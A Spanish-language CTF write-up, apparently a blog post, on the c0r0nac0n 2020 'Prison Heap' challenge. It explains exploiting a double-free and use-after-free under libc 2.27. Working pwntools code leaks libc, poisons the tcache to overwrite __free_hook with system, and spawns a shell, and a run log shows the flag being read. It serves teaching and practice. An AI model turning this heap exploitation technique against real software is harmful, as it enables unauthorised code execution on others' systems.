---
layout: post
title: c0r0nac0n 2020 - Exploiting - Prison Heap (heap, libc 2.27)
tags: heap, libc 2.27
---

### Resumen

Tenemos un reto de heap clásico, con 3 opciones en el menú: escribir, leer y liberar.

El binario tiene 2 vulnerabilidades:
* permite liberar el mismo registro varias veces
* podemos leer un registro ya liberado

![checksec]({{site.base_url}}/files/c0r0nac0n/checksec.png)

Vemos que están habilitadas todas las medidas de seguridad, y que el binario usa PIE. Esto significa que, de entrada, no tenemos ninguna dirección de memoria conocida a la que agarrarnos.

### Leak libc

El tcache de libc 2.26 y superiores, mantiene una lista de chunks liberados por tamaño y thread de ejecución. Almacena hasta un total de 7 chunks. Una vez lleno, funciona igual que en versiones anteriores, y el chunk liberado, en función de su tamaño, va al bin que le corresponda (fastbin, smallbin, unsorted bin).

Los chunks en el tcache se almacenan en una lista doblemente enlazada (punteros `fd` y `bk`). Usando la vulnerabilidad use-after-free podríamos liberar uno y obtener su contenido (veríamos el puntero `fd`), pero serían direcciones del heap, que no nos sirven.

En cambio, si liberamos 8 veces un chunk del tamaño adecuado, 7 llenarían el tcache y el octavo entraría al unsorted bin, y su parámetro `fd` pasaría a contener un puntero al `main_arena`. Esta dirección está entro de la libc, y su distancia con la dirección base puede calcularse fácilmente.

![unsorted chunk]({{site.base_url}}/files/c0r0nac0n/unsorted.png)

```python
write_prison(0xf8) #0
write_prison(0x20) #1

for i in range(7):
    free_prison(0)

free_prison(0)

leak = read_prison(0)[:6]+"\x00\x00"
libc_arena = unpack(leak)
libc_address = libc_arena - 0x3ebca0
```

### Shell

Una vez tenemos la dirección base de libc, nuestro objetivo será ejecutar `system("/bin/sh")`.

Una buena opción, cuando es posible, es sobrescribir el puntero de `__free_hook`. Esta funcion será llamada cada vez que se libere un bloque con `free()`, y se le pasará como parámetro el chunk que se está liberando. 

Sobrescribiremos ese puntero con la dirección de `system`, de forma que cuando liberemos un chunk que contenga `"/bin/sh\x00"`, nos proporcione el shell.

```python
target_chunk = libc.sym['__free_hook']

# Creamos un chunk y lo liberamos dos veces
write_prison(0x68) #2
free_prison(2)
free_prison(2)

# Sobrescribimos el puntero fd del chunk una primera vez.
write_prison(0x68, pack(target_chunk)) #3

# Ahora mismo la lista del tcache apunta al mismo chunk, pero con su fd modificado en el paso anterior
# Lo solicitaremos de nuevo, pero esta vez sin alterar su contenido:
write_prison(0x68, "") #4

# En estos momentos la lista de bloques libres del tcache apunta a nuestra dirección objetivo
# Reservaremos de nuevo un chunk del mismo tamaño, y escribiremos la dirección de system
write_prison(0x68, pack(libc.sym['system'])) #5
```

Ya solo falta crear un chunk con el comando que queramos ejecutar y liberarlo.

```python
write_prison(0x30, "/bin/sh\x00") #6
free_prison(6)

io.interactive()
```

### Ejecución

```bash
$ python exploit_prison1.py
[*] '/home/CTF/C0r0naC0n/Exploit/Heap1/prison_heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 161.35.30.233 on port 1337: Done
[*] u'/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Libc arena:     7fb9a0a38ca0
[*] Libc base:      7fb9a064d000
[*] Target_chunk:     7fb9a0a3a8e8
[*] Switching to interactive mode

$ cat home/prison/prison_heap/flag.txt
flag{h34p_Pr1s0n_1s_34sy_To_byp4ss}
```

En breve, el writeup de Prison Heap 2.

## Descargas


* [exploit_prison1.py]({{site.base_url}}/files/c0r0nac0n/exploit_prison1.py)
* [prison_heap]({{site.base_url}}/files/c0r0nac0n/prison_heap)
* [libc-2.27.so]({{site.base_url}}/files/c0r0nac0n/libc-2.27.so)
